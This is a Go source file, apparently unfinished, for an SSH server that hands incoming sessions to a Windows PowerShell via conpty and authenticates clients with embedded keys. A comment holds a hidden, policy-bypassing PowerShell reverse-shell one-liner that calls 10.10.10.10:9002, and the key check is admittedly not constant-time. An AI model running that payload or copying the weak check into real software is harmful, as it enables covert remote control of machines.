package server
// https://github.com/awgh/sshell/blob/master/sshell.go
import (
	"fmt"
	// "strings"
	"io"
	"time"
	"os"
	"encoding/binary"
	"net"
	"reflect"
	"errors"
	"syscall"
	// "unsafe"
	"sync"
	"os/exec"
	"os/user"
	// "runtime"
	ssh "golang.org/x/crypto/ssh"
	// pty "github.com/kr/pty"
	// https://github.com/ActiveState/termtest/tree/master/conpty
	keys "sshclientcli/v1/keys"
	portmap "sshclientcli/v1/portmap"
	// config "sshclientcli/v1/config"
	// terminal "golang.org/x/crypto/ssh/terminal"
	// config "sshclientcli/v1/config"
	// "github.com/awgh/sshell/commands"
	// commands "github.com/awgh/sshell/commands"
	// pty "github.com/creack/pty"
	conpty "github.com/ActiveState/termtest/conpty"
	// https://pkg.go.dev/golang.org/x/crypto/ssh#example-NewServerConn
	// https://github.com/ActiveState/termtest/blob/master/conpty/syscall_windows.go
)

// var DEFAULT_SHELL = "/bin/bash"
var DEFAULT_SHELL = "sh"
var USER_NUMBER_INT = 0
var SSH_SERVER_PORT string
// var AUTHORIZED_KEYS = map[string]string{
// 	"user": "AAAAC3NzaC1lZDI1NTE5AAAAIADi9ZoVZstck6ELY0EIB863kD4qp5i6DYpQJHkwBiEo" ,
// }
var SSH_SERVER_CONFIG = &ssh.ServerConfig{
	//ServerVersion:     "SSH-2.0-OpenSSH_7.3p1 Debian-1",
	ServerVersion:     "" ,
	PublicKeyCallback: PublicKeyCallback ,
}

func PublicKeyCallback( remoteConn ssh.ConnMetadata , remoteKey ssh.PublicKey ) ( *ssh.Permissions , error ) {
	// Parse public key
	// parsedAuthPublicKey, err := ssh.ParsePublicKey([]byte(authPublicKeyBytes))
	public_key := keys.PUBLIC[ USER_NUMBER_INT - 1 ]
	fmt.Println( public_key )
	// parsedAuthPublicKey , err := ssh.ParsePublicKey( public_key )
	parsedAuthPublicKey, _, _, _, err := ssh.ParseAuthorizedKey( public_key )
	if err != nil {
		fmt.Println("Could not parse public key")
		fmt.Println( err )
		return nil, err
	}

	// Make sure the key types match
	if remoteKey.Type() != parsedAuthPublicKey.Type() {
		fmt.Println("Key types don't match")
		return nil, errors.New("Key types do not match")
	}

	remoteKeyBytes := remoteKey.Marshal()
	authKeyBytes := parsedAuthPublicKey.Marshal()

	// Make sure the key lengths match
	if len(remoteKeyBytes) != len(authKeyBytes) {
		fmt.Println("Key lengths don't match")
		return nil, errors.New("Keys do not match")
	}

	// Make sure every byte of the key matches up
	// TODO: This should be a constant time check
	keysMatch := true
	for i, b := range remoteKeyBytes {
		if b != authKeyBytes[i] {
			keysMatch = false
		}
	}

	if keysMatch == false {
		fmt.Println("Keys don't match")
		return nil, errors.New("Keys do not match")
	}

	return nil, nil
}

func HandleRequests( reqs <-chan *ssh.Request ) {
	for req := range reqs {
		fmt.Printf( "recieved out-of-band request: %+v\n" , req )
		// channel, requests, err := newChannel.Accept()
		req.Reply(true , []byte("ok"))
	}
}


func parseDims(b []byte) (uint32, uint32) {
	w := binary.BigEndian.Uint32(b)
	h := binary.BigEndian.Uint32(b[4:])
	return w, h
}

// Winsize stores the Height and Width of a terminal.
type Winsize struct {
	Height uint16
	Width  uint16
	x      uint16 // unused
	y      uint16 // unused
}

// // SetWinsize sets the size of the given pty.
// func SetWinsize(fd uintptr, w, h uint32) {
// 	fmt.Printf("window resize %dx%d\n", w, h)
// 	ws := &Winsize{Width: uint16(w), Height: uint16(h)}
// 	syscall.Syscall(syscall.SYS_IOCTL, fd, uintptr(syscall.TIOCSWINSZ), uintptr(unsafe.Pointer(ws)))
// }

func PtyRun(c *exec.Cmd, tty *os.File) (err error) {
	// defer tty.Close()
	// in := c.InPipe()
	// in = tty
	// out := c.OutPipe()
	// out = tty
	// c.Stdin = tty
	// c.Stderr = tty
	// switch runtime.GOOS {
	// 	case "linux":
	// 		c.SysProcAttr = &syscall.SysProcAttr{
	// 			Setctty: true,
	// 			Setsid:  true,
	// 		}
	// 	case "darwin":
	// 		c.SysProcAttr = &syscall.SysProcAttr{
	// 			Setctty: true,
	// 			Setsid:  true,
	// 		}
	// 	case "windows":
	// 		break
	// }
	return c.Start()
}

var OPEN_PTYS []*conpty.ConPty
func SpawnPowerShellInstance() ( cpty *conpty.ConPty ) {
	cpty, err := conpty.New(80, 25)
	// cpty.inPipe = *os.File
	// cpty.outPipe = *os.File
	// cpty.Resize(cols uint16, rows uint16)
	if err != nil {
		fmt.Printf("Could not open a conpty terminal: %v\n", err)
	}
	defer cpty.Close()

	pid, _, err := cpty.Spawn(
		"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
		[]string{},
		&syscall.ProcAttr{
			Env: os.Environ(),
		},
	)
	if err != nil {
		fmt.Printf("Could not spawn a powershell: %v\n", err)
	}
	fmt.Printf("New process with pid %d spawned\n", pid)

	// Give powershell some time to start
	time.Sleep(1 * time.Second)
	process, err := os.FindProcess(pid)
	if err != nil {
		fmt.Printf("Failed to find process: %v\n", err)
	}
	fmt.Println( process )
	defer func() {
		ps, err := process.Wait()
		if err != nil {
			fmt.Printf("Error waiting for process: %v\n", err)
		}
		fmt.Printf("exit code was: %d\n", ps.ExitCode())
	}()

	cpty.Write([]byte("echo \"hello world\"\r\n"))
	// cpty.Write([]byte(`powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.10.10",9002);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\r\n`))
	// cpty.Write([]byte("calc\r\n"))
	if err != nil {
		fmt.Printf("Failed to write to conpty: %v\n", err)
	} else {
		fmt.Println( "Successfully exec'd command in powershell" )
	}
	OPEN_PTYS = append( OPEN_PTYS , cpty )
	return
}

func LaunchPowershell( channel ssh.Channel ) {
	fmt.Printf( "Launching Powershell\n" )
	user_info , _ := user.Current()
	go SpawnPowerShellInstance()
	time.Sleep( 3 * time.Second )
	fmt.Println( "back" )
	file_path := fmt.Sprintf( "%s\\AppData\\Local\\Temp\\ttyasdf.tmp" , user_info.HomeDir )
	fmt.Println( file_path )
	// os.Create( file_path )
	tty , _ := os.OpenFile( file_path , os.O_RDWR , 0 )
	// tty , _ := os.CreateTemp( "" , "ttyasdf" )
	defer tty.Close()
	fmt.Println( tty )

	// pty.inPipe = *os.File
	// pty.outPipe = *os.File
	ps_pty := OPEN_PTYS[ len( OPEN_PTYS ) - 1 ]
	fmt.Println( ps_pty )

	in_pipe := ps_pty.InPipe()
	out_pipe := ps_pty.OutPipe()
	// PtyRun(c *exec.Cmd, tty *os.File)
	// in_pipe = tty
	// out_pipe = tty
	fmt.Println( in_pipe )
	fmt.Println( out_pipe )
	// c.Stderr = tty

	// // Teardown session
	var once sync.Once
	close := func() {
		channel.Close()
		fmt.Printf("session closed\n")
	}

	// Pipe session to bash and visa-versa
	go func() {
		io.Copy(channel, out_pipe)
		// io.Copy(channel, out_pipe)
		once.Do(close)
	}()

	go func() {
		io.Copy(in_pipe, channel)
		// io.Copy(in_pipe, channel)
		once.Do(close)
	}()
}

func HandleChannels( chans <-chan ssh.NewChannel ) {
	// Service the incoming Channel channel.
	for newChannel := range chans {
		// Channels have a type, depending on the application level
		// protocol intended. In the case of a shell, the type is
		// "session" and ServerShell may be used to present a simple
		// terminal interface.
		if t := newChannel.ChannelType(); t != "session" {
			newChannel.Reject(ssh.UnknownChannelType, fmt.Sprintf("unknown channel type: %s", t))
			continue
		}
		channel, requests, err := newChannel.Accept()
		fmt.Println( reflect.TypeOf(channel) )
		fmt.Println( channel )
		if err != nil {
			fmt.Printf("could not accept channel (%s)", err)
			continue
		}

		// Sessions have out-of-band requests such as "shell", "pty-req" and "env"
		go func(in <-chan *ssh.Request) {
			for req := range in {
				//fmt.Printf("%v %s", req.Payload, req.Payload)
				ok := false
				switch req.Type {
				case "exec":
					// ok = true
					command := string(req.Payload[4 : req.Payload[3]+4])
					fmt.Println( req.Payload )
					fmt.Println( command )
					SpawnPowerShellInstance()
					// cmd := exec.Command(shell, []string{"-c", command}...)

					// cmd.Stdout = channel
					// cmd.Stderr = channel
					// cmd.Stdin = channel

					// err := cmd.Start()
					// if err != nil {
					// 	fmt.Printf("could not start command (%s)", err)
					// 	continue
					// }
					// // teardown session
					go func() {
						// _, err := cmd.Process.Wait()
						// if err != nil {
						// 	fmt.Printf("failed to exit bash (%s)", err)
						// }
						channel.Close()
						fmt.Printf("session closed")
					}()
					continue
				case "shell":
					fmt.Println( "inside shell" )
					LaunchPowershell( channel )
					ok = true
				case "pty-req":
					// if len( OPEN_PTYS ) > 0 {
					// 	ok = true
					// 	termLen := req.Payload[3]
					// 	// termEnv := string(req.Payload[4 : termLen+4])
					// 	w , h := parseDims(req.Payload[termLen+4:])
					// 	fmt.Printf( "%v === %v\n" , w , h )
					// 	OPEN_PTYS[ len( OPEN_PTYS ) - 1 ].Resize( uint16( h ) , uint16( w ) )
					// }
					ok = true
					continue
				case "window-change":
					// if len( OPEN_PTYS ) > 0 {
					// 	ok = true
					// 	w , h := parseDims( req.Payload )
					// 	fmt.Printf( "%v === %v\n" , w , h )
					// 	// https://github.com/ActiveState/termtest/blob/master/conpty/conpty_windows.go#L213
					// 	OPEN_PTYS[ len( OPEN_PTYS ) - 1 ].Resize( uint16( h ) , uint16( w ) )
					// }
					ok = true
					continue
				}
				if !ok {
					fmt.Printf("declining %s request...\n", req.Type)
				}
				// ok = true
				req.Reply(ok, nil)
			}
		}(requests)
	}
}


func Serve( user_number_int int ) {
	fmt.Println( "Serve()" )
	SSH_SERVER_PORT = fmt.Sprint( portmap.PORTS[ user_number_int - 1][0] )
	USER_NUMBER_INT = user_number_int

	// 1.) Setup Authentication
	parsed_private_key , parsed_private_key_err := ssh.ParsePrivateKey( keys.PRIVATE[ user_number_int - 1 ] )
	if parsed_private_key_err != nil { fmt.Println( parsed_private_key_err ); fmt.Println( "here , error 1" ) }
	SSH_SERVER_CONFIG.AddHostKey( parsed_private_key )

	// 2.) Start SSH Server
	listener , err := net.Listen( "tcp4" , "0.0.0.0" + ":" + SSH_SERVER_PORT )
	if err != nil { fmt.Printf( "Failed to listen on %s (%s)\n" , SSH_SERVER_PORT , err ) }
	fmt.Printf( "listening on %s:%s\n" , "0.0.0.0" , SSH_SERVER_PORT )

	// 3.) Respond To each Connection
	for {
		tcpConn , err := listener.Accept()
		if err != nil {
			fmt.Printf( "failed to accept incoming connection (%s)\n" , err )
			continue
		}
		// Before use, a handshake must be performed on the incoming net.Conn.
		sshConn , chans , reqs , err := ssh.NewServerConn( tcpConn , SSH_SERVER_CONFIG )
		if err != nil {
			fmt.Printf( "failed to handshake (%s)\n" , err )
			continue
		}

		// Check remote address
		fmt.Printf( "new connection from %s (%s)\n" , sshConn.RemoteAddr() , sshConn.ClientVersion() )

		// Print incoming out-of-band Requests
		go HandleRequests( reqs )
		// Accept all channels
		go HandleChannels( chans )

		defer tcpConn.Close()
	}
	defer listener.Close()
}